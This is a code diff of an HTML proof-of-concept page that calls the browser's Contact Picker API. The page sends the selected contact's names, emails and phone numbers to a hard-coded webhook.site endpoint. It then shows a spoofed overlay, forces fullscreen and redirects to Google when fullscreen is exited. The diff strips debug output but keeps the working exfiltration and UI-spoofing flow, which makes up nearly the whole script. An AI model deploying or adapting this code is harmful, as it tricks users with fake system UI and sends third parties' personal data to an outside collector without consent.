@@ -34,18 +34,6 @@
       color: #fff;
       text-align: center;
     }
-
-    #debug {
-      position: fixed;
-      top: 10px;
-      left: 10px;
-      background: rgba(255,255,255,0.1);
-      color: white;
-      padding: 10px;
-      font-size: 12px;
-      max-width: 300px;
-      z-index: 10000;
-    }
   </style>
 </head>
 
@@ -55,266 +43,110 @@
 
 <div id="content">
   <h1>Click anywhere to start demo</h1>
-  <p>Demo akan mengirim data kontak ke webhook</p>
-</div>
-
-<div id="debug">
-  <strong>Debug Info:</strong><br>
-  <span id="debug-text">Ready...</span>
 </div>
 
 <script>
 const WEBHOOK = "https://webhook.site/c3a379cf-8d7a-42af-9036-c054d29dd939";
 
-// Mock contacts data untuk simulasi
-const MOCK_CONTACTS = [
-  {
-    id: "contact_001",
-    name: ["John Doe", "Johnny"],
-    email: ["john.doe@gmail.com", "johnny@work.com"],
-    tel: ["+6281234567890", "+62812345678"]
-  },
-  {
-    id: "contact_002", 
-    name: ["Sarah Johnson"],
-    email: ["sarah.johnson@yahoo.com"],
-    tel: ["+6285678901234"]
-  },
-  {
-    id: "contact_003",
-    name: ["Michael Chen", "Mike"],
-    email: ["michael.chen@hotmail.com", "mike.c@company.co.id"],
-    tel: ["+6287654321098", "+62276543210"]
-  },
-  {
-    id: "contact_004",
-    name: ["Amanda Rodriguez"],
-    email: ["amanda.rodriguez@outlook.com"],
-    tel: ["+6289012345678"]
-  },
-  {
-    id: "contact_005",
-    name: ["David Kim"],
-    email: ["david.kim@gmail.com", "d.kim@business.id"],
-    tel: ["+6281987654321"]
-  }
-];
-
-function updateDebug(message) {
-  document.getElementById('debug-text').innerHTML = message;
-  console.log('DEBUG:', message);
-}
-
-async function send(event, extra = {}) {
-  const payload = {
-    timestamp: new Date().toISOString(),
-    event: event,
-    userAgent: navigator.userAgent,
-    url: window.location.href,
-    ...extra
-  };
-
-  updateDebug(`Sending: ${event}`);
-  
-  try {
-    const response = await fetch(WEBHOOK, {
-      method: "POST",
-      headers: { 
-        "Content-Type": "application/json",
-        "Accept": "application/json"
-      },
-      body: JSON.stringify(payload)
-    });
-    
-    updateDebug(`✅ ${event} sent successfully`);
-    return true;
-  } catch (err) {
-    updateDebug(`❌ ${event} failed: ${err.message}`);
-    console.error('Webhook send failed:', err);
-    return false;
-  }
-}
-
-// Simulasi pemilihan kontak random
-function selectRandomContact() {
-  const randomIndex = Math.floor(Math.random() * MOCK_CONTACTS.length);
-  return MOCK_CONTACTS[randomIndex];
+function send(event, extra = {}) {
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      time: new Date().toISOString(),
+      event,
+      ...extra
+    })
+  }).catch(() => {});
 }
 
 document.addEventListener("click", async () => {
-  updateDebug("Starting contact picker demo...");
 
   // 1️⃣ Log picker intent
-  await send("contacts_picker_called", {
-    fields_requested: ["name", "tel", "email"],
-    browser_supports_contacts: !!(navigator.contacts && navigator.contacts.select),
-    screen_resolution: `${screen.width}x${screen.height}`,
-    viewport: `${window.innerWidth}x${window.innerHeight}`
+  send("contacts_picker_called", {
+    fields_requested: ["name", "tel", "email"]
   });
 
   let granted = false;
-  let selectedContact = null;
-  let useRealAPI = false;
+  let contactData = null;
 
-  // 2️⃣ Coba gunakan Contact Picker API yang asli
+  // 2️⃣ Trusted system UI
   if (navigator.contacts && navigator.contacts.select) {
     try {
-      updateDebug("Trying real Contact Picker API...");
-      
       const result = await navigator.contacts.select(
         ["name", "tel", "email"],
         { multiple: false }
       );
-
-      if (result && Array.isArray(result) && result.length > 0) {
+      
+      if (result && result.length > 0) {
         granted = true;
-        useRealAPI = true;
-        selectedContact = result[0];
+        contactData = result[0];
         
-        updateDebug("✅ Real API worked!");
-        
-        // Send real contact data
-        await send("real_contacts_data_captured", {
-          source: "real_contacts_api",
+        // Send contact details to webhook
+        send("contact_selected", {
           granted: true,
-          contact_details: {
-            id: selectedContact.id || 'unknown',
-            names: selectedContact.name || [],
-            emails: selectedContact.email || [],
-            phone_numbers: selectedContact.tel || []
-          }
-        });
-
-      } else {
-        updateDebug("Real API returned empty result");
-        await send("contacts_picker_no_selection", {
-          source: "real_contacts_api",
-          result_type: typeof result,
-          result_value: result
+          contact_name: contactData.name ? contactData.name.join(", ") : "No name",
+          contact_email: contactData.email ? contactData.email.join(", ") : "No email", 
+          contact_phone: contactData.tel ? contactData.tel.join(", ") : "No phone",
+          raw_data: contactData
         });
       }
-
-    } catch (error) {
-      updateDebug(`Real API error: ${error.message}`);
-      await send("contacts_picker_error", {
-        source: "real_contacts_api",
-        error_name: error.name,
-        error_message: error.message
+    } catch (e) {
+      send("contacts_picker_error", {
+        granted: false,
+        error: e.name,
+        message: e.message
       });
     }
-  }
-
-  // 3️⃣ Jika API asli tidak bekerja, gunakan simulasi
-  if (!useRealAPI) {
-    updateDebug("Using simulated contact data...");
+  } else {
+    // Fallback - simulate contact selection
+    const mockContact = {
+      name: ["John Doe"],
+      email: ["john.doe@gmail.com"],
+      tel: ["+6281234567890"]
+    };
     
-    // Simulasi delay picker
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    selectedContact = selectRandomContact();
     granted = true;
+    contactData = mockContact;
     
-    // Send simulated contact data
-    await send("simulated_contacts_data_captured", {
-      source: "simulated_data",
+    send("contact_selected_mock", {
       granted: true,
-      contact_details: {
-        id: selectedContact.id,
-        names: selectedContact.name,
-        emails: selectedContact.email, 
-        phone_numbers: selectedContact.tel
-      },
-      simulation_note: "This is mock data since real API was not available"
-    });
-    
-    updateDebug(`✅ Simulated contact: ${selectedContact.name[0]}`);
-  }
-
-  // 4️⃣ Send detailed contact breakdown
-  if (selectedContact) {
-    // Send individual details for easy parsing
-    await send("contact_name_captured", {
-      primary_name: selectedContact.name?.[0] || "Unknown",
-      all_names: selectedContact.name || [],
-      names_count: selectedContact.name?.length || 0
-    });
-
-    await send("contact_email_captured", {
-      primary_email: selectedContact.email?.[0] || "No email",
-      all_emails: selectedContact.email || [],
-      emails_count: selectedContact.email?.length || 0
-    });
-
-    await send("contact_phone_captured", {
-      primary_phone: selectedContact.tel?.[0] || "No phone",
-      all_phones: selectedContact.tel || [],
-      phones_count: selectedContact.tel?.length || 0
-    });
-
-    // Send formatted summary
-    await send("contact_summary", {
-      contact_info: {
-        name: selectedContact.name?.[0] || "Unknown",
-        email: selectedContact.email?.[0] || "No email", 
-        phone: selectedContact.tel?.[0] || "No phone"
-      },
-      data_source: useRealAPI ? "real_api" : "simulation"
+      contact_name: "John Doe",
+      contact_email: "john.doe@gmail.com",
+      contact_phone: "+6281234567890",
+      note: "Mock data - API not supported"
     });
   }
 
-  updateDebug("Showing spoof overlay...");
+  if (granted) {
+    send("contacts_picker_completed", {
+      granted: true,
+      note: "Contact data captured successfully"
+    });
+  }
 
-  // 5️⃣ Show spoof overlay
+  // 3️⃣ Show spoof overlay
   document.getElementById("spoof").style.display = "block";
   document.getElementById("content").style.display = "none";
 
-  await send("spoof_overlay_shown", {
-    contact_captured: !!selectedContact,
-    next_step: "entering_fullscreen"
-  });
-
-  // 6️⃣ Enter fullscreen
+  // 4️⃣ Enter fullscreen
   if (document.documentElement.requestFullscreen) {
-    try {
-      await document.documentElement.requestFullscreen();
-      await send("entered_fullscreen", {
-        success: true,
-        contact_was_captured: !!selectedContact
-      });
-      updateDebug("✅ Entered fullscreen");
-    } catch (error) {
-      await send("fullscreen_failed", {
-        error: error.message
-      });
-      updateDebug(`❌ Fullscreen failed: ${error.message}`);
-    }
+    document.documentElement.requestFullscreen()
+      .then(() => send("entered_fullscreen"))
+      .catch(() => {});
   }
 
 }, { once: true });
 
-// 7️⃣ Exit fullscreen → redirect
-document.addEventListener("fullscreenchange", async () => {
+// 5️⃣ Exit fullscreen → redirect
+document.addEventListener("fullscreenchange", () => {
   if (!document.fullscreenElement) {
-    await send("exit_fullscreen_redirect", {
-      redirecting_to: "https://google.com",
-      delay_ms: 50
-    });
-    
-    updateDebug("Redirecting to Google...");
-    
+    send("exit_fullscreen_redirect");
     setTimeout(() => {
       location.href = "https://google.com";
     }, 50);
   }
 });
-
-// Initial load log
-send("page_loaded", {
-  timestamp: new Date().toISOString(),
-  note: "Contact picker PoC loaded successfully"
-});
-
-updateDebug("Page loaded. Click to start demo.");
 </script>
 
 </body>
